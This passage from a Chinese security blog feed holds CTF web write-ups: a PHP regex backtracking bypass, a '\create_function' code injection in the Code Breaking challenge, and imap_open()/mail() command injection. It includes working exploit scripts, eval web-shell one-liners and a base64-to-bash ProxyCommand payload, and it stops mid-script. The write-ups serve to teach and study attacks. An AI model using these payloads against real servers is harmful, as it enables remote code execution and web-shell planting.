title="payload编写与getflag"></a>payload编写与getflag</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">'&lt;?php eval($_REQUEST[sky]);//'</span>+<span class="string">'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">'http://106.14.114.127:22001/index.php'</span>, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">path = r.headers[<span class="string">'Location'</span>]</span><br><span class="line">url = <span class="string">'http://106.14.114.127:22001/'</span>+path</span><br><span class="line"><span class="comment"># print url</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="comment"># 'sky':"var_dump(scandir('../../../'));"</span></span><br><span class="line"><span class="string">'sky'</span>:<span class="string">"var_dump(file_get_contents('../../../flag_php7_2_1s_c0rrect'));"</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure><p>我们运行即可得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop python sky.py</span><br><span class="line">string(38) &quot;flag&#123;216728a834fb4c1e0bc6893e135f436e&#125;&quot;</span><br></pre></td></tr></table></figure></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>参照之前的测试，我们发现回溯失败的时候返回是false，而正常情况是0或者1，所以这里我们只要在if判断时，使用<code>===</code>即可，如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_php($data) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>不得不膜一下p神，为许多正则Bypass提供了这么多奇技淫巧，这一点和之前的<code>\</code>打头的正则Bypass都能在日后测试中为我们拓宽攻击面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于合天智汇</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目概述&quot;&gt;&lt;a href=&quot;#题目概述&quot; class=&quot;headerlink&quot; title=&quot;题目概述&quot;&gt;&lt;/a&gt;题目概述&lt;/h2&gt;&lt;p&gt;题目源码如下&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2018 Code Breaking(1) &amp; function</title>
    <link href="http://skysec.top/2019/03/10/2018-Code-Breaking-1-function/"/>
    <id>http://skysec.top/2019/03/10/2018-Code-Breaking-1-function/</id>
    <published>2019-03-10T04:59:00.000Z</published>
    <updated>2019-03-12T07:00:25.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Code Breaking是ph牛搭建的代码审计挑战赛：<a href="https://code-breaking.com" target="_blank" rel="noopener">https://code-breaking.com</a><br>刚发布的时候一直忙于开展研究生的生活和一些琐事，没法认真研究和学习，最近闲下来了，于是打算填下这个坑~<br>题目ph牛均已开源至github：<a href="https://github.com/phith0n/code-breaking（必须star" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking（必须star</a> XD）</p><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码言简意赅，首先是希望我们输入两个参数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br></pre></td></tr></table></figure></p><p>其中双问号为三元运算表达式，等价于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$action = $_GET[<span class="string">'action'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span>;</span><br></pre></td></tr></table></figure></p><p>即输入两个参数，若输入，则取我们的输入，否则为空<br>然后是对<code>$_GET[&#39;action&#39;]</code>的正则表达式过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)</span><br></pre></td></tr></table></figure></p><p>如果不被匹配到正则，则可以进行如下操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action(<span class="string">''</span>, $arg);</span><br></pre></td></tr></table></figure></p><h2 id="漏洞点思考"><a href="#漏洞点思考" class="headerlink" title="漏洞点思考"></a>漏洞点思考</h2><p>题目意思也很简单，我们的关注点应该停留到正则匹配上，因为一旦绕过正则，则可以进行危险函数构造，成功getshell或是读取文件，我们先来看一下正则<code>/^[a-z0-9_]*$/isD</code>的意思：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/i 不区分大小写</span><br><span class="line">/s 匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[ \f\n\r\t\v]</span><br><span class="line">/D 如果使用$限制结尾字符,则不允许结尾有换行;</span><br></pre></td></tr></table></figure></p><p>那么很显然，所有以数字，字母，下划线等开头的value都会被过滤，我们无法进入下面的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action(<span class="string">''</span>, $arg);</span><br></pre></td></tr></table></figure></p><p>那么现在的目的很简单：<br>按照正则的意思，找到一个不是以数字，字母，下划线等开头的value，同时可以正常执行函数<br>我们曾经有如下正则Bypass的样例<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(.*)flag(.*)$/'</span>, $payload))</span><br></pre></td></tr></table></figure></p><p>对于<code>^</code>开头，<code>$</code>结尾的正则，如果用<code>.</code>进行任意字符匹配，那么则不包括换行符<br>所以这种情况我们可以用<code>%0a</code>进行bypass<br><img src="/images/2019-03-03-19-42-23.png" alt=""><br><img src="/images/2019-03-03-19-42-36.png" alt=""><br>这里我们利用%0a打头，成功bypass正则，达到任意input，那么我们也没有相同的思路去bypass现在的正则呢？<br>既然要顺应正则的意思，我们不妨看看有没有什么特殊字符可以达到一样的效果，不妨进行字符fuzz</p><h2 id="字符fuzz"><a href="#字符fuzz" class="headerlink" title="字符fuzz"></a>字符fuzz</h2><p>既然要找一个这样满足条件的字符，我们可以进行fuzz<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">tmp = hex(i)[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">if</span> len(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">tmp = <span class="string">'0'</span>+hex(i)[<span class="number">2</span>:]</span><br><span class="line">tmp = <span class="string">'%'</span>+tmp</span><br><span class="line">url = <span class="string">'http://localhost:22000/?action='</span>+tmp+<span class="string">'var_dump&amp;arg=23333'</span></span><br><span class="line">r = requests.get(url=url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'23333'</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"><span class="keyword">print</span> url</span><br></pre></td></tr></table></figure></p><p>可以得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string(0) &quot;&quot;</span><br><span class="line">string(5) &quot;23333&quot;</span><br><span class="line"></span><br><span class="line">http://106.14.114.127:22000/?action=%5cvar_dump&amp;arg=23333</span><br><span class="line">[Finished in 5.3s]</span><br></pre></td></tr></table></figure></p><p>我们发现当且仅当使用<code>%5c</code>打头时，我们可以正常运行<code>var_dump()</code>，并且成功满足正则。<br>那么这是为什么呢？<br>ph牛有如下总结<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php里默认命名空间是\，所有原生函数和类都在这个命名空间中。</span><br><span class="line">普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；</span><br><span class="line">而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。</span><br><span class="line">如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</span><br></pre></td></tr></table></figure></p><p>同时我们参考php手册<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.php.net/manual/zh/language.namespaces.rationale.php</span><br></pre></td></tr></table></figure></p><p>其中有如下样例代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">my</span>\<span class="title">name</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;&#125;</span><br><span class="line"><span class="keyword">const</span> MYCONST = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> MyClass;</span><br><span class="line">$c = <span class="keyword">new</span> \my\name\MyClass;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">namespace</span>\<span class="title">MYCONST</span>;</span><br><span class="line">$d = <span class="keyword">__NAMESPACE__</span> . <span class="string">'\MYCONST'</span>;</span><br><span class="line"><span class="keyword">echo</span> constant($d); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以很直观的看出对比，以及<code>\</code>的用法</p><h2 id="getshell函数寻找"><a href="#getshell函数寻找" class="headerlink" title="getshell函数寻找"></a>getshell函数寻找</h2><p>那么既然现在我们找到了利用<code>\</code>进行正则bypass的方法，则需要找一个合适的getshell / readfile函数<br>这里注意到参数的构造方式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action(<span class="string">''</span>, $arg);</span><br></pre></td></tr></table></figure></p><p>很显然，需要一个可以输入至少2个参数的函数，同时第二个参数存在RCE的风险<br>这里可以简单翻阅我之前写的<code>PHP Command / Code Injection Summary</code><br>链接如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2018/03/09/php-command%20or%20code-injection-summary/</span><br></pre></td></tr></table></figure></p><p>不难找到如下函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function ( string $args , string $code )</span><br></pre></td></tr></table></figure></p><p>通过官方样例<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">'$a,$b'</span>, <span class="string">'return "ln($a) + ln($b) = " . log($a * $b);'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"New anonymous function: $newfunc\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们可以得到<code>create_function()</code>这样的原型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a,$b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"ln($a) + ln($b) = "</span> . log($a * $b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>第一个参数控制函数的变量名，第二个参数控制函数内的代码<br>那么我们这里<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action(<span class="string">''</span>, $arg);</span><br></pre></td></tr></table></figure></p><p>可以说很容易进行代码注入拼接达到bypass，例如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$arg = <span class="keyword">return</span> <span class="string">"2333"</span>;&#125;phpinfo();<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p><p>我们不妨带入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a,$b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"2333"</span>;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="comment">/*&#125;</span></span><br></pre></td></tr></table></figure></p><p>可以发现，这样即可进行RCE，我们测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:22000/?action=%5ccreate_function&amp;arg=return &quot;2333&quot;;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-03-21-17-04.png" alt=""><br>发现成功执行了phpinfo</p><h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p>那么我们插入一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$arg = <span class="keyword">return</span> <span class="string">"2333"</span>;&#125;<span class="keyword">eval</span>($_REQUEST[<span class="string">'sky'</span>]);<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=%5ccreate_function&amp;arg=return &quot;2333&quot;;&#125;eval($_REQUEST[&apos;sky&apos;]);/*&amp;sky=system(&apos;ls&apos;);</span><br></pre></td></tr></table></figure></p><p>但是得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: system() has been disabled for security reasons in /var/www/html/index.php(8) : runtime-created function(1) : eval()&apos;d code on line 1</span><br></pre></td></tr></table></figure></p><p>那么我们更改命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sky=var_dump(scandir(&apos;./&apos;));</span><br></pre></td></tr></table></figure></p><p>得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>我们继续查看上层目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sky=var_dump(scandir(&apos;../&apos;));</span><br></pre></td></tr></table></figure></p><p>得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(31) &quot;flag_h0w2execute_arb1trary_c0de&quot; [3]=&gt; string(4) &quot;html&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>至此，我们成功getflag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_h0w2execute_arb1trary_c0de</span><br></pre></td></tr></table></figure></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本地考察的难点应该在于字符fuzz，用<code>\</code>打头bypass过滤提供了一个不错的思路，在日后的bypass上，不妨进行相应的测试~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于合天智汇</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Code Breaking是ph牛搭建的代码审计挑战赛：&lt;a href=&quot;https://code-breaking.com&quot; target
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>从一道题看imap_open() rce</title>
    <link href="http://skysec.top/2019/02/25/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8Bimap_open()%20RCE/"/>
    <id>http://skysec.top/2019/02/25/从一道题看imap_open() RCE/</id>
    <published>2019-02-25T08:32:19.000Z</published>
    <updated>2019-02-26T07:56:20.859Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本题为2019安恒2月月赛的my email，从漏洞点发现到getshell还是有点意思的，以下是记录</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到题目先看一遍功能，发现存在注册和登录功能<br><img src="/images/2019-02-25-16-45-53.png" alt=""><br>随便注册个账号，登入，得到信息<br><img src="/images/2019-02-25-16-46-21.png" alt=""><br>发现还有完善信息页面<br><img src="/images/2019-02-25-16-46-41.png" alt=""><br>看样子需要邮箱授权，我们随便测试一下<br><img src="/images/2019-02-25-16-47-27.png" alt=""><br>虽然提示我授权失败，但是来到主页，已经完善信息完成<br><img src="/images/2019-02-25-16-48-01.png" alt=""><br>发现增加功能：更换背景<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10014/user/upload.php</span><br></pre></td></tr></table></figure></p><p>发现是文件上传功能<br>我们测试一下，随意上传一个图片，查看一下源代码，发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">    background-image: url(./user/skysky.jpg);</span><br><span class="line">    background-size: 100%,100%;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得到上传路径与命名规则<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dir = <span class="string">'./user/'</span>.$username.<span class="string">'.jpg'</span>;</span><br></pre></td></tr></table></figure></p><p>不难发现，最后保存路径存在可控点$username，我们进行二次注入探测<br>注册用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skysky.php%00</span><br></pre></td></tr></table></figure></p><p>登入后发现用户名变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skysky.php\0</span><br></pre></td></tr></table></figure></p><p>猜测应该注册处存在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes($username)</span><br></pre></td></tr></table></figure></p><p>那么应该很难使用$username去上传shell</p><h2 id="攻击点思考"><a href="#攻击点思考" class="headerlink" title="攻击点思考"></a>攻击点思考</h2><p>目前来看，情况僵硬，必须思考一下如何串联上述功能进行攻击了<br>既然不是直接upload+register进行getshell，那么势必需要用到邮件功能<br>不妨google一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php+mail+rce</span><br></pre></td></tr></table></figure></p><p>发现如下两个函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP mail()</span><br><span class="line">PHP imap_open()</span><br></pre></td></tr></table></figure></p><p>为进一步确定方向和攻击点，我们看一下邮箱处需要的参数<br><img src="/images/2019-02-25-17-10-51.png" alt=""><br>我们再看上述3种和邮件有关的RCE<br>首先是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP mail()</span><br></pre></td></tr></table></figure></p><p>我们知道其参数为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool mail(</span><br><span class="line">    string $to,</span><br><span class="line">    string $subject,</span><br><span class="line">    string $message [,</span><br><span class="line">    string $additional_headers [,</span><br><span class="line">    string $additional_parameters ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>这里的界面应该类似于写邮件，例如<br><img src="/images/2019-02-25-18-15-22.png" alt=""><br>而漏洞点即在于mail函数的第五个参数没有正确过滤，我们可以通过如下方式进行RCE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">email=</span><br><span class="line">-sky@skysec.top -OqueueDirectory=/ -Xskyskysky.php</span><br><span class="line">title=</span><br><span class="line">&lt;?php eval($_GET[sky]);?&gt;</span><br></pre></td></tr></table></figure></p><p>而这里我们的参数为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email，sign，server</span><br></pre></td></tr></table></figure></p><p>功能为邮箱授权，感觉有些对不上号，我们再看看<code>imap_open()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imap_open ( string $mailbox , string $username , string $password [, int $options = <span class="number">0</span> [, int $n_retries = <span class="number">0</span> [, <span class="keyword">array</span> $params = <span class="keyword">NULL</span> ]]] ) : resource</span><br></pre></td></tr></table></figure></p><p>漏洞点在于第一个参数<code>$mailbox</code><br>详细解析可见<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable-functions-in-php-installations-6ccdbf4f52bb</span><br></pre></td></tr></table></figure></p><h2 id="imap-open-攻击测试"><a href="#imap-open-攻击测试" class="headerlink" title="imap_open()攻击测试"></a>imap_open()攻击测试</h2><p>于是综上所述，我们将目光放在imap_open()上开始测试，我们可利用如下脚本生成payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = $argv[<span class="number">1</span>];</span><br><span class="line">$encoded_payload = base64_encode($payload);</span><br><span class="line">$server = “any -o ProxyCommand=<span class="keyword">echo</span>\t”.$encoded_payload.”|base64\t-d|bash&#125;”;</span><br><span class="line"><span class="keyword">print</span>(“payload: &#123;$server&#125;”.PHP_EOL);</span><br></pre></td></tr></table></figure></p><p>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">any -o ProxyCommand=echo\tbHM=|base64\t-d|bash&#125;</span><br></pre></td></tr></table></figure></p><p>我们测试一下，由于imap_open是php的扩展模块，我们这里选择找个docker测试<br>随便搜一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search imap</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-25-18-47-22.png" alt=""><br>选择一个后pull<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull fedosov/docker-php-imap-composer</span><br></pre></td></tr></table></figure></p><p>进入容器进行测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd fedosov/docker-php-imap-composer /bin/bash</span><br><span class="line">docker attach id</span><br></pre></td></tr></table></figure></p><p>先写一个带有imap_open的1.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"echo skysky|tee /tmp/success"</span>;</span><br><span class="line">$encoded_payload = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"any -o ProxyCommand=echo\t"</span>.$encoded_payload.<span class="string">"|base64\t-d|bash"</span>;</span><br><span class="line">@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-25-18-50-04.png" alt=""><br>我们可以明显看到，运行前tmp目录为空目录，运行后，tmp目录生成了success文件，文件内容为我们指定的skysky<br>这样一来攻击点就清晰了：利用邮箱授权功能往<code>./user/</code>目录写入shell即可<br>注：为什么不执行命令呢？因为这里命令不回显……写shell的话要方便很多</p><h2 id="题目攻击点测试"><a href="#题目攻击点测试" class="headerlink" title="题目攻击点测试"></a>题目攻击点测试</h2><p>生成payload脚本为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"echo '&lt;?php phpinfo();' &gt; /var/www/html/user/sky.php"</span>;</span><br><span class="line">$encoded_payload = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"any -o ProxyCommand=echo\t"</span>.$encoded_payload.<span class="string">"|base64\t-d|bash"</span>;</span><br><span class="line"><span class="keyword">echo</span> 